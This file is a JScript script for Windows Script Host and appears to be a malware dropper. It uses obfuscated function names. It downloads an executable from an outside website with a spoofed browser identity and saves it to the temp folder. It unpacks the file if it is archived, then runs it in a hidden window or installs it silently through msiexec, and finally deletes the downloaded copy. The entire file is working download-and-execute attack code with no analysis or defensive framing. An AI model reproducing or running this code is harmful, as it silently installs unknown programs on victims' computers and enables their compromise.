try{if(typeof WScript!="undefined"&&/wscript/i.test(WScript.FullName))WScript.Interactive=false}catch(_q){}
(function(){
function ink8892(p){
var G=(function(){return this})(),c="CreateObject",a="ActiveXObject";
try{if(typeof WScript!=="undefined"&&WScript[c])return WScript[c](p)}catch(e0){}
try{return new (G[a])(p)}catch(e1){}
return null}
var sh=ink8892("WScript.Shell");
var fso=ink8892("Scripting.FileSystemObject");
if(!sh||!fso)return;
var tmp=fso["GetSpecialFolder"](2).Path;
var sep="\\";
var raw=tmp+sep+"6dd3.bin";
var dir=tmp+sep+"6dd3";
var url="https://abilityindisabilityindia.org/wewe.exe";
var xExe=".exe",xMsi=".msi",xDll=".dll",xZip=".zip";
var ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
function orbit_24k(ms){
try{if(typeof WScript!=="undefined"&&WScript["Sleep"]){WScript["Sleep"](ms);return}}catch(eS){}
var t0=new Date().getTime();while(new Date().getTime()-t0<ms){}
}
function mark7431(u){
u=""+u;try{u=(function(){return this})()["decodeURIComponent"](u)}catch(e0){}
var q=u.indexOf("?");if(q>=0)u=u.substring(0,q);
var h=u.indexOf("#");if(h>=0)u=u.substring(0,h);
u=u.replace(/\\/g,"/").toLowerCase();
var slash=u.lastIndexOf("/");if(slash>=0)u=u.substring(slash+1);
var dot=u.lastIndexOf(".");return dot>=0?u.substring(dot):"";
}
function band46982(n,ext){n=""+n;return n.length>=ext.length&&n.substring(n.length-ext.length)===ext}
function lnode985(u){u=""+u;var i=u.indexOf("://");if(i<0)return "";var j=u.indexOf("/",i+3);return j<0?u:u.substring(0,j)}
function Opal482(req,u){
var H="SetRequestHeader";
try{req[H]("User-Agent",ua)}catch(e){}
try{req[H]("Accept","*/*")}catch(e){}
try{req[H]("Accept-Language","en-US,en;q=0.9")}catch(e){}
var org=lnode985(u);if(org)try{req[H]("Referer",org+"/")}catch(e){}
}
function weave93115(u){
var body=null,ok=false,O="Open",S="Send",B="ResponseBody",T="Status",G="GET";
try{
var http=ink8892("WinHttp.WinHttpRequest.5.1");if(!http)throw 1;
http[O](G,u,false);
try{http["Option"](4)=13056}catch(e7){}
try{http["Option"](6)=true}catch(e8){}
Opal482(http,u);
http[S]();
if(http[T]>=200&&http[T]<300){body=http[B];ok=true}
}catch(eA){}
if(ok)return body;
try{
var x=ink8892("MSXML2.ServerXMLHTTP.6.0");if(!x)throw 1;
x["open"](G,u,false);
try{x["setRequestHeader"]("User-Agent",ua)}catch(e){}
try{x["setRequestHeader"]("Accept","*/*")}catch(e){}
var org=lnode985(u);if(org)try{x["setRequestHeader"]("Referer",org+"/")}catch(e){}
x["send"]();
if(x["status"]>=200&&x["status"]<300){body=x["responseBody"];ok=true}
}catch(eC){}
return ok?body:null;
}
function dhard682(root){
var exe=null,msi=null,paired=false,q=[root],guard=0;
while(q.length&&guard++<256){
var folder=q.shift(),hasDll=false,localExe=null;
try{
var files=new Enumerator(fso["GetFolder"](folder).Files);
for(;!files.atEnd();files.moveNext()){
var it=files.item(),n=(""+it.Name).toLowerCase();
if(band46982(n,xDll))hasDll=true;
if(band46982(n,xExe)&&!localExe)localExe=it.Path;
if(band46982(n,xMsi)&&!msi)msi=it.Path;
}
if(localExe){if(hasDll){exe=localExe;paired=true}else if(!exe)exe=localExe}
var subs=new Enumerator(fso["GetFolder"](folder).SubFolders);
for(;!subs.atEnd();subs.moveNext())q.push(subs.item().Path);
}catch(e1){}
}
return {exe:exe,msi:msi,paired:paired};
}
function mband136(p){
try{sh["CurrentDirectory"]=fso["GetParentFolderName"](p)}catch(e2){}
sh["Run"]("\""+p+"\"",0,false);
}
function stack_76k(p){
sh["Run"]("msiexec.exe /i "+"\""+p+"\""+" /qn",0,false);
}
function kivory601(src,dst){
var sa=ink8892("Shell.Application");if(!sa)return false;
var zipNs=sa["NameSpace"](src),dstNs=sa["NameSpace"](dst);
if(!zipNs||!dstNs)return false;
var items=zipNs["Items"]();if(!items||items.Count<1)return false;
dstNs["CopyHere"](items,0x14);
var t1=new Date().getTime()+90000,best=null,seenAt=0;
while(new Date().getTime()<t1){
try{var hit=dhard682(dst);if(hit.exe||hit.msi){best=hit;if(!seenAt)seenAt=new Date().getTime();if(hit.paired||hit.msi)return true;if(new Date().getTime()-seenAt>8000)return true}}catch(e3){}
orbit_24k(350);
}
return !!(best&&(best.exe||best.msi));
}
try{if(fso["FolderExists"](dir))fso["DeleteFolder"](dir,true)}catch(e4){}
try{fso["CreateFolder"](dir)}catch(e5){}
try{if(fso["FileExists"](raw))fso["DeleteFile"](raw,true)}catch(e6){}
var fetchUrl=(""+url).split("#")[0];
var body=null;try{body=weave93115(fetchUrl)}catch(_net){return}
if(body===null||body===undefined)return;
var st=ink8892("ADODB.Stream");if(!st)return;
st["Type"]=1;st["Open"]();st["Write"](body);
st["SaveToFile"](raw,2);st["Close"]();
if(!fso["FileExists"](raw)||fso["GetFile"](raw).Size<1)return;
var tip=mark7431(url),exe=null,msi=null;
var dropExe=tmp+sep+"6dd3.exe";
var dropMsi=tmp+sep+"6dd3.msi";
var dropZip=tmp+sep+"6dd3.zip";
function nylon96131(dst){try{if(fso["FileExists"](dst))fso["DeleteFile"](dst,true)}catch(em){}fso["CopyFile"](raw,dst,true);return dst}
if(tip===xMsi){msi=nylon96131(dropMsi)}
else if(tip===xExe){exe=nylon96131(dropExe)}
else{
var zpath=nylon96131(dropZip);
var got=kivory601(zpath,dir);
if(got){var hit=dhard682(dir);exe=hit.exe;msi=hit.msi}
if(!exe&&!msi)exe=nylon96131(dropExe);
try{if(fso["FileExists"](zpath))fso["DeleteFile"](zpath,true)}catch(e12){}
}
if(exe)mband136(exe);
else if(msi)stack_76k(msi);
try{if(fso["FileExists"](raw))fso["DeleteFile"](raw,true)}catch(e10){}
})();
